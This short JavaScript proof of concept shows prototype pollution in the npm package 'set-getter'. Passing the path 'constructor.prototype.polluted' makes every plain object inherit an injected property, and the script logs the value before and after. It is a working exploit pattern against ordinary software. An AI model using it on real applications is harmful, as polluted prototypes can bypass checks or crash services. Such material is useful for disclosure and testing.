var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var setGetter = require('set-getter');
var obj = {};
console.log({}.polluted);
setGetter(obj, 'constructor.prototype.polluted', function (polluted) {
    return 'yes';
});
console.log({}.polluted);